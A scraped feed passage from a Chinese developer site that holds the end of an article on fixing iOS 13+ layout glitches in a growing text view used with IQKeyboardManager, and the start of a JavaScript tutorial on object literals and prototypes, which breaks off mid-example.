                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在开发 IM 聊天界面或动态表单时，自适应高度输入框（Growing TextView）是标配。但很多开发者发现，原本运行良好的代码，在开启了 <code>IQKeyboardManager</code> 或是升级到 iOS 13+ 后，开始出现“灵异现象”：<strong>换行时文字突然消失、光标乱跳，或者视图在瞬移。</strong></p>
<p>这并不是因为你的代码逻辑写错了，而是由于 iOS 13 之后，底层布局引擎的“脾气”变了。</p>
<hr/>
<h3 data-id="heading-1">一、 核心矛盾：三方势力的坐标争夺战</h3>
<p>在复杂的嵌套场景（如 <code>UIScrollView</code> 套 <code>NIMGrowingTextView</code>）下，输入框其实处于一个非常微妙的竞争环境：</p>
<ol>
<li><strong>NIMGrowingTextView</strong>：它在实时计算高度并修改自身的 <code>frame</code>。</li>
<li><strong>IQKeyboardManager</strong>：它在监控光标位置，通过修改 <code>contentOffset</code> 强行把视图顶起来，防止键盘遮挡。</li>
<li><strong>iOS 13+ 系统引擎</strong>：引入了更严格的布局检测。只要坐标在极短时间内（毫秒级）产生两次非一致性跳变，系统就会尝试“纠偏”，导致渲染闪烁。</li>
</ol>
<p><strong>为什么文字会消失？</strong></p>
<p>当你输入换行，你的代码刚把高度撑开，<code>IQKeyboardManager</code> 为了防止遮挡紧接着做了一次位移，而 iOS 13 此时可能还在后台计算文字排版。多方冲突下，最终计算出的偏移量可能直接把文字推到了可视区域之外。</p>
<hr/>
<h3 data-id="heading-2">二、 iOS 13+ 系统层面的重大调整</h3>
<ol>
<li>
<p><strong>布局死循环检测（Layout Loop Detection）</strong> ：</p>
<p>iOS 13 极其反感在 <code>layoutSubviews</code> 里做不稳定的 frame 修改。即使是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.000001</mn></mrow><annotation encoding="application/x-tex">0.000001</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.000001</span></span></span></span></span> 像素的误差，也会被系统捕捉并触发重复布局，这正是闪烁的根源。</p>
</li>
<li>
<p><strong>TextKit 的异步化趋势</strong>：</p>
<p><code>UITextView</code> 现在的排版不再是完全同步的。当你调用 <code>sizeThatFits:</code> 拿高度时，拿到的可能是个“中间状态”，导致你的布局更新永远比系统的渲染慢半拍。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">三、 具体的业务场景优化方案</h3>
<p>针对这种复杂的业务场景，建议采用“<strong>精确容错+时序调整</strong>”的策略。</p>
<h4 data-id="heading-4">1. 引入高度变化的“避震器”（Threshold）</h4>
<p>不要盲目相信系统的 <code>!=</code> 判断。在 <code>NIMGrowingTextView.m</code> 的 <code>fitToScrollView</code> 方法中，增加阈值过滤：</p>
<p>Objective-C</p>
<pre><code class="hljs language-ini" lang="ini">// 1. 计算出新旧高度差
BOOL <span class="hljs-attr">isHeightChanged</span> = ABS(oldScrollViewFrame.size.height - newScrollViewFrame.size.height) &gt; <span class="hljs-number">0.5</span><span class="hljs-comment">;</span>

// 2. 只有高度变化真正达到 0.5 像素（约 1 个像素点）时才去改 Frame
if (isHeightChanged) {
    <span class="hljs-attr">self.frame</span> = newScrollViewFrame<span class="hljs-comment">;</span>
    <span class="hljs-section">[self invalidateIntrinsicContentSize]</span><span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-5">2. 使用异步校准（Async Scrolling）</h4>
<p>这是解决“文字消失”的关键。我们要利用主线程的任务优先级，让滚动发生在系统和 IQ 库都“折腾完”之后。</p>
<p>Objective-C</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">// 记录用户是否在底部，误差容忍度设为 2.0</span>
<span class="hljs-type">BOOL</span> wasAtBottom = (<span class="hljs-keyword">self</span>.contentOffset.y + <span class="hljs-keyword">self</span>.frame.size.height &gt;= <span class="hljs-keyword">self</span>.contentSize.height - <span class="hljs-number">2.0</span>);

<span class="hljs-keyword">if</span> (wasAtBottom || isHeightChanged) {
    <span class="hljs-comment">// 异步不是为了换线程，是为了跳出当前布局循环</span>
    <span class="hljs-comment">// 在下一帧 RunLoop 强制校准位置，把文字“拉回来”</span>
    <span class="hljs-built_in">dispatch_async</span>(dispatch_get_main_queue(), ^{
        [<span class="hljs-keyword">self</span> scrollToBottom]; 
    });
}
</code></pre>
<h4 data-id="heading-6">3. 复杂嵌套场景：果断切换为“手动挡”</h4>
<p>在 IM 这种深层嵌套、且对交互要求极高的页面，<code>IQKeyboardManager</code> 的自动管理往往会弄巧成拙。</p>
<p><strong>推荐做法</strong>：在该 ViewController 中局部禁用 IQ，改由手动监听键盘通知调整约束。虽然多写了代码，但换来了绝对的掌控力。</p>
<p>Objective-C</p>
<pre><code class="hljs language-ini" lang="ini">- (void)viewWillAppear:(BOOL)animated {
    <span class="hljs-section">[super viewWillAppear:animated]</span><span class="hljs-comment">;</span>
    // 嵌套滚动视图是 IQ 的“禁区”，建议关闭以防止坐标重叠干扰
    <span class="hljs-section">[IQKeyboardManager sharedManager]</span>.<span class="hljs-attr">enable</span> = <span class="hljs-literal">NO</span><span class="hljs-comment">;</span>
}

- (void)viewWillDisappear:(BOOL)animated {
    <span class="hljs-section">[super viewWillDisappear:animated]</span><span class="hljs-comment">;</span>
    <span class="hljs-section">[IQKeyboardManager sharedManager]</span>.<span class="hljs-attr">enable</span> = <span class="hljs-literal">YES</span><span class="hljs-comment">; // 离开页面别忘还原</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-7">四、 总结：开发者要如何应对“不确定性”？</h3>
<ul>
<li><strong>从硬匹配到容错匹配</strong>：iOS 13+ 时代，<code>ABS(diff) &gt; threshold</code> 是比 <code>!=</code> 更安全的布局判断。</li>
<li><strong>理解 RunLoop 的执行顺序</strong>：<code>dispatch_async</code> 是 UI 稳定性的“最后一公里”，它能帮你解决绝大多数的时序冲突。</li>
<li><strong>手动控制的必要性</strong>：业务越复杂，就越要减少对“全家桶”式三方库的依赖，回归底层手动管理。</li>
</ul>
<h3 data-id="heading-8">结语</h3>
<p>Bug 的出现往往意味着旧的开发模式已经不再适配新的系统规则。通过<strong>阈值过滤</strong>和<strong>时序优化</strong>，我们不仅能修复“消失的文字”，更能让 App 在 iOS 13 后的环境中运行得更加优雅。</p>
<hr/>
<p><strong>希望这篇实战分享能帮你解决那些磨人的布局问题！如果觉得有用，欢迎点赞支持。🚀</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 对象创建完全指南：从对象字面量到 Class 继承]]></title>    <link>https://juejin.cn/post/7602259669730623515</link>    <guid>https://juejin.cn/post/7602259669730623515</guid>    <pubDate>2026-02-03T05:21:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730623515" data-draft-id="7602243150157889563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" JavaScript 对象创建完全指南：从对象字面量到 Class 继承"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T05:21:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不会敲代码1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             JavaScript 对象创建完全指南：从对象字面量到 Class 继承
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不会敲代码1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:21:11.000Z" title="Tue Feb 03 2026 05:21:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 对象创建完全指南：从对象字面量到 Class 继承</h2>
<h3 data-id="heading-1">第一章：深入理解JavaScript的面向对象</h3>
<h4 data-id="heading-2">1.1 JavaScript的"独特"面向对象哲学</h4>
<p>JavaScript采用了一种与众不同的面向对象编程（OOP）范式。要真正掌握它，我们需要先理解两个核心概念：</p>
<p><strong>基于原型 vs 基于类</strong>：</p>
<p>想象你要制作一批玩具猫：</p>
<ul>
<li><strong>传统面向对象（Java/C++等）</strong>：
就像用模具制造玩具：
<ol>
<li>先设计模具（类 Class）</li>
<li>用模具批量生产（实例化）</li>
<li>每个玩具都从同一个模具出来，结构相同</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Java示例（对比理解）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {  <span class="hljs-comment">// 模具</span>
    String name;
    String color;
    
    Cat(String name, String color) {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.color = color;
    }
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> {
        System.out.println(name + <span class="hljs-string">"在吃东西"</span>);
    }
}

<span class="hljs-type">Cat</span> <span class="hljs-variable">garfield</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>);  <span class="hljs-comment">// 用模具生产</span>
</code></pre>
<ul>
<li><strong>JavaScript面向对象</strong>：
更像细胞分裂或DNA复制：
<ol>
<li>有一个原型对象（就像DNA）</li>
<li>新对象从这个原型"继承"特性</li>
<li>可以随时修改原型，影响所有"后代"</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript原型示例</span>
<span class="hljs-keyword">const</span> catDNA = {  <span class="hljs-comment">// 原型，像DNA模板</span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫科动物"</span>,
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
};

<span class="hljs-keyword">const</span> garfield = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(catDNA);  <span class="hljs-comment">// 基于DNA创建</span>
garfield.<span class="hljs-property">name</span> = <span class="hljs-string">"加菲猫"</span>;
garfield.<span class="hljs-property">color</span> = <span class="hljs-string">"黄色"</span>;
</code></pre>
<h4 data-id="heading-3">1.2 为什么JavaScript选择这种模式？</h4>
<p>JavaScript在1995年被创造时，设计者Brendan Eich有几个考虑：</p>
<ol>
<li><strong>轻量级</strong>：不需要复杂的类系统</li>
<li><strong>动态性</strong>：运行时可以修改对象结构</li>
<li><strong>简单性</strong>：基于已有的对象创建新对象更直观</li>
</ol>
<p>这种设计使得JavaScript非常灵活，但也让初学者感到困惑。让我们一步步揭开它的神秘面纱。</p>
<h3 data-id="heading-4">第二章：最基础的创建方式——对象字面量</h3>
<h4 data-id="heading-5">2.1 什么是对象字面量？</h4>
<p>对象字面量是JavaScript中最直接的对象创建方式。就像手工制作工艺品，每个都是独立完成的。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建一个猫对象——完全手工制作</span>
<span class="hljs-keyword">const</span> cat1 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span>,      <span class="hljs-comment">// 属性：名字</span>
    <span class="hljs-attr">color</span>: <span class="hljs-string">"黄色"</span>,       <span class="hljs-comment">// 属性：颜色</span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,          <span class="hljs-comment">// 属性：种类</span>
    <span class="hljs-attr">age</span>: <span class="hljs-number">3</span>,              <span class="hljs-comment">// 属性：年龄</span>
    
    <span class="hljs-comment">// 方法：行为</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃意大利面"</span>);
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在沙发上睡觉"</span>);
    },
    
    <span class="hljs-comment">// ES6简写方法</span>
    <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"喵喵~ 我是"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    }
};

<span class="hljs-comment">// 使用对象</span>
cat1.<span class="hljs-title function_">eat</span>();      <span class="hljs-comment">// 输出：加菲猫在吃意大利面</span>
cat1.<span class="hljs-title function_">meow</span>();     <span class="hljs-comment">// 输出：喵喵~ 我是加菲猫</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">age</span>);  <span class="hljs-comment">// 输出：3</span>
</code></pre>
<h4 data-id="heading-6">2.2 对象字面量的工作原理</h4>
<p>当你在JavaScript中写下 <code>{}</code>，引擎会：</p>
<ol>
<li><strong>内存分配</strong>：在内存中分配空间</li>
<li><strong>属性存储</strong>：将属性名和值存储为键值对</li>
<li><strong>方法存储</strong>：函数也是对象，被存储在内存中</li>
<li><strong>引用返回</strong>：返回这个对象的引用（内存地址）</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 深入了解对象结构</span>
<span class="hljs-keyword">const</span> cat = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"咪咪"</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">"白色"</span>
};

<span class="hljs-comment">// 实际在内存中是这样的：</span>
<span class="hljs-comment">// cat → [内存地址] → {</span>
<span class="hljs-comment">//     name: "咪咪" (存储在内存某处)</span>
<span class="hljs-comment">//     color: "白色" (存储在内存另一处)</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-7">2.3 动态添加和修改属性</h4>
<p>对象字面量创建的对象是完全动态的：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cat = { <span class="hljs-attr">name</span>: <span class="hljs-string">"小黄"</span> };

<span class="hljs-comment">// 动态添加属性</span>
cat.<span class="hljs-property">color</span> = <span class="hljs-string">"黄色"</span>;           <span class="hljs-comment">// 添加颜色属性</span>
cat[<span class="hljs-string">"age"</span>] = <span class="hljs-number">2</span>;              <span class="hljs-comment">// 另一种添加方式</span>
cat.<span class="hljs-property">owner</span> = {                <span class="hljs-comment">// 添加对象属性</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">"小明"</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">10</span>
};

<span class="hljs-comment">// 动态添加方法</span>
cat.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
};

<span class="hljs-comment">// 动态修改属性</span>
cat.<span class="hljs-property">name</span> = <span class="hljs-string">"大黄"</span>;           <span class="hljs-comment">// 修改名字</span>
cat.<span class="hljs-property">age</span> += <span class="hljs-number">1</span>;                <span class="hljs-comment">// 年龄增加</span>

<span class="hljs-comment">// 动态删除属性</span>
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">owner</span>;            <span class="hljs-comment">// 删除owner属性</span>

<span class="hljs-comment">// 检查属性是否存在</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> cat);          <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">gender</span>);             <span class="hljs-comment">// undefined</span>
</code></pre>
<h4 data-id="heading-8">2.4 对象字面量的优缺点分析</h4>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>简单直观</strong>：语法清晰，易于理解</li>
<li><strong>快速创建</strong>：不需要复杂的定义过程</li>
<li><strong>灵活修改</strong>：可以随时添加、修改、删除属性</li>
<li><strong>JSON兼容</strong>：JSON格式就是基于对象字面量</li>
</ul>
<p><strong>缺点</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 问题1：代码重复（创建多个相似对象时）</span>
<span class="hljs-keyword">const</span> cat1 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">"黄色"</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"吃鱼"</span>); }
};

<span class="hljs-keyword">const</span> cat2 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"小白猫"</span>,      <span class="hljs-comment">// 重复的属性定义</span>
    <span class="hljs-attr">color</span>: <span class="hljs-string">"白色"</span>,       <span class="hljs-comment">// 重复的属性定义  </span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,          <span class="hljs-comment">// 重复的属性定义</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"吃鱼"</span>); }  <span class="hljs-comment">// 重复的函数定义</span>
};

<span class="hljs-comment">// 问题2：类型关系不明确</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">constructor</span>);  <span class="hljs-comment">// Object，不是Cat</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1 <span class="hljs-keyword">instanceof</span> ?); <span class="hljs-comment">// 没有类型概念</span>

<span class="hljs-comment">// 问题3：方法重复创建，浪费内存</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>);  <span class="hljs-comment">// false，两个相同的函数</span>
</code></pre>
<h4 data-id="heading-9">2.5 适用场景</h4>
<p>对象字面量最适合以下情况：</p>
<ol>
<li><strong>配置对象</strong>：一次性使用的设置</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">apiUrl</span>: <span class="hljs-string">"https://api.example.com"</span>,
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>,
    <span class="hljs-attr">retryTimes</span>: <span class="hljs-number">3</span>,
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
    }
};
</code></pre>
<ol start="2">
<li><strong>数据容器</strong>：临时存储数据</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> formData = {
    <span class="hljs-attr">username</span>: <span class="hljs-string">"john_doe"</span>,
